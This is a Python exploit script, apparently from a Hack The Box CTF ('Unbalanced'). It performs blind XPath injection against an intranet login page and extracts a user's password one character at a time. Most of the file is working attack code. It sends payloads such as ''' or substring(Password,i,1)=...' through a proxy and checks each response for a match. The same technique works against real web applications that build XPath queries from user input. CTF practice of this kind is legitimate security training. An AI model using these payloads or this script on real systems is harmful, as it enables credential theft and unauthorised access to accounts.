himport requests, string

print('''
##################################################################################################
#
#  xpath.py - HTB Unbalanced - Xpath injection password extraction
#  crypticsilence 08-06-2020
#
#    Modified this from code found on:
#                https://book.hacktricks.xyz/pentesting-web/xpath-injection
#
#    References:
#                https://tipstrickshack.blogspot.com/2013/11/xpath-injection-tutorial.html
#                https://www.paladion.net/blogs/xpath-injection-in-xml-databases
#
##################################################################################################
''')

username="bryan"  #@unbalanced.htb"

proxies = {
  "http": "http://10.10.10.200:3128"
}
url = "http://172.31.179.1/intranet.php"
maxlength = 32 # maximum length of password to extract

l = 0
flag = ""
alphabet = string.ascii_letters + "0123456789{}_()!@#$%^&*()-=+;:<>?,./"

'''     # this was not working for this specific query, did not go back to it..
print("[ ] Finding parent node name..")
for i in range(1, 30):
  print("[i] Looking for parent node char number " + str(i))
  for al in alphabet:
    DATA = { "Username":"' or substring(name(parent::*[position()=1]),"+str(i)+",1)='"+al, "Password":"no" }
    print("\rTrying : "+al+" data: "+str(DATA),end='')
    r = requests.post(url, data=DATA, proxies=proxies)
    #print(r.text)
    if (username+"@unbalanced.htb" in r.text):
      flag += al
      print("[+] Parent node name (so far) : " + flag)
      break
'''
print("[ ] Finding length of string.. max length "+str(maxlength))
for i in range(maxlength):
  DATA = { "Username":username, "Password":"' or string-length(Password)="+str(i)+" or '0'='1" }
  print("\rTrying i="+str(i)+" -- data: "+str(DATA),end='')
  r = requests.post(url, data=DATA, proxies=proxies)
  if (username+"@unbalanced.htb" in r.text):
    l = i
    print("\n[+] Password length: " + str(l))
    break
if (not l):
  print("[X] No password length (or >"+str(maxlength)+" chars) found for : "+username)
  print("\nAre we sure this user exists?")
else:
  print("[ ] Finding string.. ")
  for i in range(1, l + 1):
    nochar=1
#    print("[i] Looking for char number " + str(i))
    for al in alphabet:
      #'+or+substring(Password,1,1)='a' and Username='bryan   # thanks nikhil!!
      DATA = { "Username":username, "Password":"' or substring(Password,"+str(i)+",1)='"+al+"' and Username='"+username }
#      print("\rTrying : "+al+" data: "+str(DATA),end='')
      r = requests.post(url, data=DATA, proxies=proxies)
#      print ("Response[14]: "+r.text[0:14])   # let me know if proxy/vpn still up
      if ((username+"@unbalanced.htb") in r.text):
        nochar=0
        flag += al
        print("\r[+] Password so far : " + flag,end='')
        break
    if (nochar):
      print("\nI think we've got this..no further match")
      break
if (l!=0):
  print("\n[*] Username is : "+username)
  print("[*] Password is : "+flag)
else:
  print("[X] No password length (or >"+str(maxlength)+" chars) found for : "+username)
  print("Something went wrong..")
